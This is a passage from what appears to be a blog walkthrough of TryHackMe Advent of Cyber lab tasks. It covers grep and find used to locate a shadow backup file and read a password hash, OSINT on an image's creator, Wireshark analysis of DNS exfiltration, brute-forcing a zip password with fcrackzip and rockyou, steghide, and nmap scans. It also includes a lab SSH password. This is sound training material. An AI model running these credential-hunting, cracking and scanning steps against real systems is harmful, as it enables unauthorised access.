+</code></pre><h2 id="task-9---day-4---training">Task 9 - Day 4 - Training</h2><p>This task is about linux command line utilities.</p><h3 id="references-3">References</h3><ul><li><a href="https://docs.google.com/document/d/1CpwM_MdHgRqlPSe4eCC_-rVgi8F1xh88PKOySTRSkxU/edit" target="_blank">TryHackMe supporting material</a></ul><p>Use <code>ssh</code> to login to the machine using password <code>bestelf1234</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="ssh%20mcsysadmin@%3Cip%3E" type="button"></button></div></div><pre><code>ssh mcsysadmin@&lt;ip&gt;
+</code></pre><p>All the info can be found as below.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="[mcsysadmin@ip-10-10-26-239%20~]$%20ls%0A%3Clist%20of%20files%3E%0A%0A[mcsysadmin@ip-10-10-26-239%20~]$%20cat%20file5%0A%3Ccontent%3E%0A%0A[mcsysadmin@ip-10-10-26-239%20~]$%20grep%20-irn%20password%20.%0A./%3Cfile%3E:46:passwordHpKRQfdxzZocwg5O0RsiyLSVQon72CjFmsV4ZLGjxI8tXYo1NhLsEply%0A%0A[mcsysadmin@ip-10-10-26-239%20~]$%20grep%20-r%20-E%20-o%20%22([0-9]%7B1,3%7D[%5C.])%7B3%7D[0-9]%7B1,3%7D%22%20.%0A./file2:%3Cip%3E%0A%0A[mcsysadmin@ip-10-10-26-239%20~]$%20ls%20/home%0A%3Cusers%3E%0A%0A[mcsysadmin@ip-10-10-26-239%20~]$%20sha1sum%20file8%0A%3Csha1sum%3E%20%20file8%0A%0A[mcsysadmin@ip-10-10-26-239%20~]$%20find%20/%202%3E/dev/null%20%7C%20grep%20%22shadow.bak%22%0A/var/shadow.bak%0A%0A[mcsysadmin@ip-10-10-26-239%20~]$%20grep%20mcsysadmin%20/var/shadow.bak%0Amcsysadmin:%3Chash%3E:18234:0:99999:7:::" type="button"></button></div></div><pre><code>[mcsysadmin@ip-10-10-26-239 ~]$ ls
+&lt;list of files&gt;
+
+[mcsysadmin@ip-10-10-26-239 ~]$ cat file5
+&lt;content&gt;
+
+[mcsysadmin@ip-10-10-26-239 ~]$ grep -irn password .
+./&lt;file&gt;:46:passwordHpKRQfdxzZocwg5O0RsiyLSVQon72CjFmsV4ZLGjxI8tXYo1NhLsEply
+
+[mcsysadmin@ip-10-10-26-239 ~]$ grep -r -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" .
+./file2:&lt;ip&gt;
+
+[mcsysadmin@ip-10-10-26-239 ~]$ ls /home
+&lt;users&gt;
+
+[mcsysadmin@ip-10-10-26-239 ~]$ sha1sum file8
+&lt;sha1sum&gt;  file8
+
+[mcsysadmin@ip-10-10-26-239 ~]$ find / 2&gt;/dev/null | grep "shadow.bak"
+/var/shadow.bak
+
+[mcsysadmin@ip-10-10-26-239 ~]$ grep mcsysadmin /var/shadow.bak
+mcsysadmin:&lt;hash&gt;:18234:0:99999:7:::
+</code></pre><h2 id="task-10---day-5---ho-ho-hosint">Task 10 - Day 5 - Ho-Ho-Hosint</h2><p>This task is about using <code>exiftool</code> to get information about image and using <code>osint</code> to gather information from social websites.</p><h3 id="references-4">References</h3><ul><li><a href="https://blog.tryhackme.com/ho-ho/" target="_blank">TryHackMe supporting material</a><li><a href="https://osintframework.com/" target="_blank">OSINT Framework</a><li><a href="https://web.archive.org/" target="_blank">Web Archive</a><li><a href="https://www.google.com/imghp?hl=en" target="_blank">Google image search</a></ul><p>Use <code>exiftool</code> to check if there is any hidden information from the downloaded image.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="exiftool%20thegrinch.jpg" type="button"></button></div></div><pre><code>exiftool thegrinch.jpg
+</code></pre><p>An output similar to below will be obtained.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="ExifTool%20Version%20Number%20%20%20%20%20%20%20%20%20:%2010.80%0AFile%20Name%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20thegrinch.jpg%0ADirectory%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20.%0AFile%20Size%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%2069%20kB%0AFile%20Modification%20Date/Time%20%20%20%20%20:%202021:01:16%2018:19:32+00:00%0AFile%20Access%20Date/Time%20%20%20%20%20%20%20%20%20%20%20:%202021:01:16%2018:19:32+00:00%0AFile%20Inode%20Change%20Date/Time%20%20%20%20%20:%202021:01:16%2018:19:36+00:00%0AFile%20Permissions%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20rw-r--r--%0AFile%20Type%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20JPEG%0AFile%20Type%20Extension%20%20%20%20%20%20%20%20%20%20%20%20%20:%20jpg%0AMIME%20Type%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20image/jpeg%0AJFIF%20Version%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%201.01%0AResolution%20Unit%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20None%0AX%20Resolution%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%201%0AY%20Resolution%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%201%0AXMP%20Toolkit%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20Image::ExifTool%2010.10%0ACreator%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20%3Cuser%3E%0AImage%20Width%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20642%0AImage%20Height%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20429%0AEncoding%20Process%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20Progressive%20DCT,%20Huffman%20coding%0ABits%20Per%20Sample%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%208%0AColor%20Components%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%203%0AY%20Cb%20Cr%20Sub%20Sampling%20%20%20%20%20%20%20%20%20%20%20%20:%20YCbCr4:2:0%20(2%202)%0AImage%20Size%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%20642x429%0AMegapixels%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20:%200.275" type="button"></button></div></div><pre><code>ExifTool Version Number         : 10.80
+File Name                       : thegrinch.jpg
+Directory                       : .
+File Size                       : 69 kB
+File Modification Date/Time     : 2021:01:16 18:19:32+00:00
+File Access Date/Time           : 2021:01:16 18:19:32+00:00
+File Inode Change Date/Time     : 2021:01:16 18:19:36+00:00
+File Permissions                : rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : None
+X Resolution                    : 1
+Y Resolution                    : 1
+XMP Toolkit                     : Image::ExifTool 10.10
+Creator                         : &lt;user&gt;
+Image Width                     : 642
+Image Height                    : 429
+Encoding Process                : Progressive DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 642x429
+Megapixels                      : 0.275
+</code></pre><p>Use <code>firefox</code> to search about <code>user</code>. A <code>twitter</code> and <code>wordpress</code> page will appear in result.</p><p>The following information will be available from <code>twitter</code> user profile page.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Born%20%3Cbirthday%3E%0AI%20am%20one%20of%20%3Cprofession%3E,%20but%20am%20a%20professional%20photographer%20after%20December!%0AUs%20Elves%20can%20now%20make%20iPhone's!%20Who'da%20thought%20it!%0A%20%20~%20Sent%20from%20%3Ciphone-model%3E" type="button"></button></div></div><pre><code>Born &lt;birthday&gt;
+I am one of &lt;profession&gt;, but am a professional photographer after December!
+Us Elves can now make iPhone's! Who'da thought it!
+  ~ Sent from &lt;iphone-model&gt;
+</code></pre><p>There will be an image in the <code>wordpress</code> site. Searching about it on <code>google image search</code> will provide more information.</p><p>Upon searching for <code>wordpress</code> site on <code>wayback machine</code>, the very first archive gives information about <code>profession</code> start date.</p><h2 id="task-11---day-6---data-elf-iltration">Task 11 - Day 6 - Data Elf-iltration</h2><p>This task is about using <code>wireshark</code> to gather <code>dns</code> and <code>http</code> data and get the contents hidden in dns requests and http objects, and using <code>fcrackzip</code> to brute-force password for compressed file.</p><h3 id="references-5">References</h3><ul><li><a href="https://docs.google.com/document/d/17vU134ZfKiiE-DgiynrO0MySo4_VCGCpw2YJV_Kp3Pk/edit?usp=sharing" target="_blank">TryHackMe supporting material</a></ul><p>Using <code>wireshark</code> to analyse the packet trace.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Statistics%0A%20%20-%20Protocol%20Hierarchy%0A%0ADNS%0A%20%20-%20Apply%20as%20filter%0A%20%20%20%20%20%20-%20Selected" type="button"></button></div></div><pre><code>Statistics
+  - Protocol Hierarchy
+
+DNS
+  - Apply as filter
+      - Selected
+</code></pre><p>Check the filtered data, under packet number <code>9</code>. The hex encoded query can be decoded using <code>cyberchef</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Input%0A%20%20%20%20%3Cquery-hash%3E%0AFrom%20hex%0A%20%20%20%20%3Cstolen-info%3E" type="button"></button></div></div><pre><code>Input
+    &lt;query-hash&gt;
+From hex
+    &lt;stolen-info&gt;
+</code></pre><p>The same information can also be obtained from <code>xxd</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="echo%20'%3Cquery-hash%3E'%20%7C%20xxd%20-r%20-p" type="button"></button></div></div><pre><code>echo '&lt;query-hash&gt;' | xxd -r -p
+</code></pre><p>Use <code>wireshark</code> to export objects and analyse it.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="File%0A%20%20%20%20-%20Export%20Objects%0A%20%20%20%20%20%20%20%20-%20HTTP%0A%20%20%20%20%20%20%20%20%20%20%20%20-%20Save%20all" type="button"></button></div></div><pre><code>File
+    - Export Objects
+        - HTTP
+            - Save all
+</code></pre><p>There is a <code>zip</code> file which seems to be encrypted. Use <code>fcrackzip</code> to try an unlock the password.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="fcrackzip%20-b%20--method%202%20-D%20-p%20/usr/share/wordlists/rockyou.txt%20-v%20holidaythief/christmaslists.zip" type="button"></button></div></div><pre><code>fcrackzip -b --method 2 -D -p /usr/share/wordlists/rockyou.txt -v holidaythief/christmaslists.zip
+</code></pre><p>An output similar to below will be obtained.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="found%20file%20'christmaslistdan.tx',%20(size%20cp/uc%20%20%20%20%2091/%20%20%20%2079,%20flags%209,%20chk%209a34)%0Afound%20file%20'christmaslistdark.txt',%20(size%20cp/uc%20%20%20%20%2091/%20%20%20%2082,%20flags%209,%20chk%209a4d)%0Afound%20file%20'christmaslistskidyandashu.txt',%20(size%20cp/uc%20%20%20%20108/%20%20%20116,%20flags%209,%20chk%209a74)%0Afound%20file%20'christmaslisttimmy.txt',%20(size%20cp/uc%20%20%20%20105/%20%20%20101,%20flags%209,%20chk%209a11)%0Apossible%20pw%20found:%20december%20()" type="button"></button></div></div><pre><code>found file 'christmaslistdan.tx', (size cp/uc     91/    79, flags 9, chk 9a34)
+found file 'christmaslistdark.txt', (size cp/uc     91/    82, flags 9, chk 9a4d)
+found file 'christmaslistskidyandashu.txt', (size cp/uc    108/   116, flags 9, chk 9a74)
+found file 'christmaslisttimmy.txt', (size cp/uc    105/   101, flags 9, chk 9a11)
+possible pw found: december ()
+</code></pre><p>Extract the file with cracked credential.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="cd%20holidaythief%20;%20unzip%20christmaslists.zip" type="button"></button></div></div><pre><code>cd holidaythief ; unzip christmaslists.zip
+</code></pre><p>An output similar to below will be obtained.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Archive:%20%20christmaslists.zip%0A[christmaslists.zip]%20christmaslistdan.tx%20password:%0Aextracting:%20christmaslistdan.tx%0Ainflating:%20christmaslistdark.txt%0Ainflating:%20christmaslistskidyandashu.txt%0Ainflating:%20christmaslisttimmy.txt" type="button"></button></div></div><pre><code>Archive:  christmaslists.zip
+[christmaslists.zip] christmaslistdan.tx password:
+extracting: christmaslistdan.tx
+inflating: christmaslistdark.txt
+inflating: christmaslistskidyandashu.txt
+inflating: christmaslisttimmy.txt
+</code></pre><p>Open the text file one by one to find the <item>.</item></p><p>Check if there is any encoded content in <code>TryHackMe.jpg</code> file using <code>steghide</code> and empty passphrase.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="steghide%20extract%20-sf%20./TryHackMe.jpg" type="button"></button></div></div><pre><code>steghide extract -sf ./TryHackMe.jpg
+</code></pre><p>An output similar to below will be obtained. The file content will have <id>.</id></p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Enter%20passphrase:%0Awrote%20extracted%20data%20to%20%22christmasmonster.txt%22." type="button"></button></div></div><pre><code>Enter passphrase:
+wrote extracted data to "christmasmonster.txt".
+</code></pre><h2 id="task-11---day-7---skilling-up">Task 11 - Day 7 - Skilling up</h2><p>This task is about using <code>nmap</code> to get hidden <code>http</code> web site port.</p><h3 id="references-6">References</h3><ul><li><a href="https://docs.google.com/document/d/1q0FziVZM3zCWhcgtPpljVPzkBX0fMAh6ebrXVM5rg08/edit?usp=sharing" target="_blank">TryHackMe supporting material</a><li><a href="https://4n3i5v74.github.io/posts/cheatsheet-nmap/" target="_blank">NMAP Reference</a></ul><p>Using <code>nmap</code>, perform basic recon and get listening ports.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nmap%20-Pn%20-T4%20-sS%20--reason%20--open%20-p1-1000%20-A%20%3Cip%3E" type="button"></button></div></div><pre><code>nmap -Pn -T4 -sS --reason --open -p1-1000 -A &lt;ip&gt;
+</code></pre><p>An output similar to below will be obtained.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Starting%20Nmap%207.60%20(%20https://nmap.org%20)%20at%202021-01-17%2017:49%20GMT%0ANmap%20scan%20report%20for%20%3Chostname%3E%20(%3Cip%3E)%0AHost%20is%20up,%20received%20arp-response%20(0.00063s%20latency).%0ANot%20shown:%20997%20closed%20ports%0AReason:%20997%20resets%0APORT%20%20%20%20STATE%20SERVICE%20REASON%20%20%20%20%20%20%20%20%20%20VERSION%0A22/tcp%20%20open%20%20ssh%20%20%20%20%20syn-ack%20ttl%20255%20OpenSSH%207.4%20(protocol%202.0)%0A%7C%20ssh-hostkey:%0A%7C%20%20%202048%20bc:e4:28:72:ea:3a:ab:9a:15:8d:06:bb:07:8d:01:2f%20(RSA)%0A%7C%20%20%20256%2000:5d:66:91:3b:2b:8f:3e:01:94:f4:05:26:9b:a2:b0%20(ECDSA)%0A%7C_%20%20256%2005:bf:a3:3d:55:54:4a:09:03:a9:20:0d:15:af:68:2d%20(EdDSA)%0A111/tcp%20open%20%20rpcbind%20syn-ack%20ttl%20255%202-4%20(RPC%20#100000)%0A%7C%20rpcinfo:%0A%7C%20%20%20program%20version%20%20%20port/proto%20%20service%0A%7C%20%20%20100000%20%202,3,4%20%20%20%20%20%20%20%20111/tcp%20%20rpcbind%0A%7C%20%20%20100000%20%202,3,4%20%20%20%20%20%20%20%20111/udp%20%20rpcbind%0A%7C%20%20%20100024%20%201%20%20%20%20%20%20%20%20%20%2038801/udp%20%20status%0A%7C_%20%20100024%20%201%20%20%20%20%20%20%20%20%20%2042385/tcp%20%20status%0A999/tcp%20open%20%20http%20%20%20%20syn-ack%20ttl%20255%20SimpleHTTPServer%200.6%20(Python%203.6.8)%0A%7C_http-server-header:%20SimpleHTTP/0.6%20Python/3.6.8%0AMAC%20Address:%2002:39:76:0B:24:D9%20(Unknown)%0ANo%20exact%20OS%20matches%20for%20host%20(If%20you%20know%20what%20OS%20is%20running%20on%20it,%20see%20https://nmap.org/submit/%20).%0ATCP/IP%20fingerprint:%0AOS:SCAN(V=7.60%25E=4%25D=1/17%25OT=22%25CT=1%25CU=34454%25PV=Y%25DS=1%DC=D%25G=Y%25M=023976%25T%0AOS:M=600478DF%25P=x86_64-pc-linux-gnu)SEQ(SP=101%25GCD=1%25ISR=10A%25TI=Z%25CI=Z%25TS=A%0AOS:)SEQ(SP=101%25GCD=1%25ISR=10A%25TI=Z%25CI=Z%25II=I%25TS=A)OPS(O1=M2301ST11NW7%25O2=M23%0AOS:01ST11NW7%25O3=M2301NNT11NW7%25O4=M2301ST11NW7%25O5=M2301ST11NW7%25O6=M2301ST11)%0AOS:WIN(W1=68DF%25W2=68DF%25W3=68DF%25W4=68DF%25W5=68DF%25W6=68DF)ECN(R=Y%DF=Y%25T=FF%25W=%0AOS:6903%25O=M2301NNSNW7%CC=Y%25Q=)T1(R=Y%DF=Y%25T=FF%25S=O%25A=S+%25F=AS%25RD=0%25Q=)T2(R=N%0AOS:)T3(R=N)T4(R=Y%DF=Y%25T=FF%25W=0%25S=A%25A=Z%25F=R%25O=%25RD=0%25Q=)T5(R=Y%DF=Y%25T=FF%25W=0%0AOS:%25S=Z%25A=S+%25F=AR%25O=%25RD=0%25Q=)T6(R=Y%DF=Y%25T=FF%25W=0%25S=A%25A=Z%25F=R%25O=%25RD=0%25Q=)T7%0AOS:(R=Y%DF=Y%25T=FF%25W=0%25S=Z%25A=S+%25F=AR%25O=%25RD=0%25Q=)U1(R=Y%DF=N%25T=FF%25IPL=164%25UN=%0AOS:0%25RIPL=G%25RID=G%25RIPCK=G%25RUCK=G%25RUD=G)IE(R=Y%DFI=N%25T=FF%CD=S)%0A%0ANetwork%20Distance:%201%20hop%0ATRACEROUTE%0AHOP%20RTT%20%20%20%20%20ADDRESS%0A1%20%20%200.63%20ms%20%3Chostname%3E%20(%3Cip%3E)%0A%0AOS%20and%20Service%20detection%20performed.%20Please%20report%20any%20incorrect%20results%20at%20https://nmap.org/submit/%20.%0ANmap%20done:%201%20IP%20address%20(1%20host%20up)%20scanned%20in%2051.20%20seconds" type="button"></button></div></div><pre><code>Starting Nmap 7.60 ( https://nmap.org ) at 2021-01-17 17:49 GMT
+Nmap scan report for &lt;hostname&gt; (&lt;ip&gt;)
+Host is up, received arp-response (0.00063s latency).
+Not shown: 997 closed ports
+Reason: 997 resets
+PORT    STATE SERVICE REASON          VERSION
+22/tcp  open  ssh     syn-ack ttl 255 OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey:
+|   2048 bc:e4:28:72:ea:3a:ab:9a:15:8d:06:bb:07:8d:01:2f (RSA)
+|   256 00:5d:66:91:3b:2b:8f:3e:01:94:f4:05:26:9b:a2:b0 (ECDSA)
+|_  256 05:bf:a3:3d:55:54:4a:09:03:a9:20:0d:15:af:68:2d (EdDSA)
+111/tcp open  rpcbind syn-ack ttl 255 2-4 (RPC #100000)
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          38801/udp  status
+|_  100024  1          42385/tcp  status
+999/tcp open  http    syn-ack ttl 255 SimpleHTTPServer 0.6 (Python 3.6.8)
+|_http-server-header: SimpleHTTP/0.6 Python/3.6.8
+MAC Address: 02:39:76:0B:24:D9 (Unknown)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.60%E=4%D=1/17%OT=22%CT=1%CU=34454%PV=Y%DS=1%DC=D%G=Y%M=023976%T
+OS:M=600478DF%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10A%TI=Z%CI=Z%TS=A
+OS:)SEQ(SP=101%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M2301ST11NW7%O2=M23
+OS:01ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)
+OS:WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=FF%W=
+OS:6903%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=FF%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N
+OS:)T3(R=N)T4(R=Y%DF=Y%T=FF%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=FF%W=0
+OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=FF%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7
+OS:(R=Y%DF=Y%T=FF%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=FF%IPL=164%UN=
+OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=FF%CD=S)
+
+Network Distance: 1 hop
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.63 ms &lt;hostname&gt; (&lt;ip&gt;)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 51.20 seconds
+</code></pre><p>Using <code>firefox</code> to open the http site on port <code>999</code>, we can see a <file> accessible.</file></p><h2 id="task-12---day-8---suid-shenanigans">Task 12 - Day 8 - SUID Shenanigans</h2><p>This task is about using <code>nmap</code> to get hidden <code>ssh</code> port and using <code>SUID</code> to get user and root file contents.</p><h3 id="references-7">References</h3><ul><li><a href="https://blog.tryhackme.com/linux-privilege-escalation-suid/" target="_blank">Privilege Escalation Reference</a><li><a href="https://payatu.com/guide-linux-privilege-escalation" target="_blank">Privilege Escalation Reference</a><li><a href="https://4n3i5v74.github.io/posts/cheatsheet-nmap/" target="_blank">NMAP Reference</a></ul><p>Using <code>nmap</code>, perform basic recon and get listening ports.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nmap%20-Pn%20-T4%20-sS%20--reason%20--open%20-p-%20-A%20%3Cip%3E" type="button"></button></div></div><pre><code>nmap -Pn -T4 -sS --reason --open -p- -A &lt;ip&gt;
+</code></pre><p>An output similar to below will be obtained.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Starting%20Nmap%207.60%20(%20https://nmap.org%20)%20at%202021-01-17%2018:08%20GMT%0ANmap%20scan%20report%20for%20%3Chostname%3E%20(%3Cip%3E)%0AHost%20is%20up,%20received%20arp-response%20(0.00041s%20latency).%0ANot%20shown:%2065534%20closed%20ports%0AReason:%2065534%20resets%0APORT%20%20%20%20%20%20STATE%20SERVICE%20REASON%20%20%20%20%20%20%20%20%20VERSION%0A%3Cport%3E/tcp%20open%20%20ssh%20%20%20%20%20syn-ack%20ttl%2064%20OpenSSH%207.2p2%20Ubuntu%204ubuntu2.8%20(Ubuntu%20Linux;%20protocol%202.0)%0A%7C%20ssh-hostkey:%0A%7C%20%20%202048%20c1:f9:56:22:a7:60:00:37:62:7f:02:e3:af:b2:7f:7a%20(RSA)%0A%7C%20%20%20256%208a:5a:04:b8:74:1f:88:67:a9:6f:49:44:76:1f:1e:09%20(ECDSA)%0A%7C_%20%20256%2021:3d:f6:96:2b:0c:8c:d7:63:02:1f:01:6c:fa:d5:1f%20(EdDSA)%0AMAC%20Address:%2002:FD:D1:3B:0C:E3%20(Unknown)%0ANo%20exact%20OS%20matches%20for%20host%20(If%20you%20know%20what%20OS%20is%20running%20on%20it,%20see%20https://nmap.org/submit/%20).%0ATCP/IP%20fingerprint:%0AOS:SCAN(V=7.60%25E=4%25D=1/17%25OT=65534%25CT=1%25CU=41424%25PV=Y%25DS=1%DC=D%25G=Y%25M=02FDD%0AOS:1%25TM=60047D4D%25P=x86_64-pc-linux-gnu)SEQ(SP=F7%25GCD=1%25ISR=10C%25TI=Z%25CI=I%25TS%0AOS:=8)SEQ(SP=F7%25GCD=1%25ISR=10C%25TI=Z%25CI=RD%25II=I%25TS=8)OPS(O1=M2301ST11NW7%25O2=M%0AOS:2301ST11NW7%25O3=M2301NNT11NW7%25O4=M2301ST11NW7%25O5=M2301ST11NW7%25O6=M2301ST1%0AOS:1)WIN(W1=68DF%25W2=68DF%25W3=68DF%25W4=68DF%25W5=68DF%25W6=68DF)ECN(R=Y%DF=Y%25T=40%25%0AOS:W=6903%25O=M2301NNSNW7%CC=Y%25Q=)T1(R=Y%DF=Y%25T=40%25S=O%25A=S+%25F=AS%25RD=0%25Q=)T2(R%0AOS:=N)T3(R=N)T4(R=Y%DF=Y%25T=40%25W=0%25S=A%25A=Z%25F=R%25O=%25RD=0%25Q=)T5(R=Y%DF=Y%25T=40%25W%0AOS:=0%25S=Z%25A=S+%25F=AR%25O=%25RD=0%25Q=)T6(R=Y%DF=Y%25T=40%25W=0%25S=A%25A=Z%25F=R%25O=%25RD=0%25Q=)%0AOS:T7(R=Y%DF=Y%25T=40%25W=0%25S=Z%25A=S+%25F=AR%25O=%25RD=0%25Q=)U1(R=Y%DF=N%25T=40%25IPL=164%25U%0AOS:N=0%25RIPL=G%25RID=G%25RIPCK=G%25RUCK=G%25RUD=G)IE(R=Y%DFI=N%25T=40%CD=S)%0A%0ANetwork%20Distance:%201%20hop%0AService%20Info:%20OS:%20Linux;%20CPE:%20cpe:/o:linux:linux_kernel%0ATRACEROUTE%0AHOP%20RTT%20%20%20%20%20ADDRESS%0A1%20%20%200.41%20ms%20%3Chostname%3E%20(%3Cip%3E)%0A%0AOS%20and%20Service%20detection%20performed.%20Please%20report%20any%20incorrect%20results%20at%20https://nmap.org/submit/%20.%0ANmap%20done:%201%20IP%20address%20(1%20host%20up)%20scanned%20in%2061.13%20seconds" type="button"></button></div></div><pre><code>Starting Nmap 7.60 ( https://nmap.org ) at 2021-01-17 18:08 GMT
+Nmap scan report for &lt;hostname&gt; (&lt;ip&gt;)
+Host is up, received arp-response (0.00041s latency).
+Not shown: 65534 closed ports
+Reason: 65534 resets
+PORT      STATE SERVICE REASON         VERSION
+&lt;port&gt;/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 c1:f9:56:22:a7:60:00:37:62:7f:02:e3:af:b2:7f:7a (RSA)
+|   256 8a:5a:04:b8:74:1f:88:67:a9:6f:49:44:76:1f:1e:09 (ECDSA)
+|_  256 21:3d:f6:96:2b:0c:8c:d7:63:02:1f:01:6c:fa:d5:1f (EdDSA)
+MAC Address: 02:FD:D1:3B:0C:E3 (Unknown)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.60%E=4%D=1/17%OT=65534%CT=1%CU=41424%PV=Y%DS=1%DC=D%G=Y%M=02FDD
+OS:1%TM=60047D4D%P=x86_64-pc-linux-gnu)SEQ(SP=F7%GCD=1%ISR=10C%TI=Z%CI=I%TS
+OS:=8)SEQ(SP=F7%GCD=1%ISR=10C%TI=Z%CI=RD%II=I%TS=8)OPS(O1=M2301ST11NW7%O2=M
+OS:2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST1
+OS:1)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%
+OS:W=6903%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R
+OS:=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W
+OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+OS:T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%U
+OS:N=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.41 ms &lt;hostname&gt; (&lt;ip&gt;)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 61.13 seconds
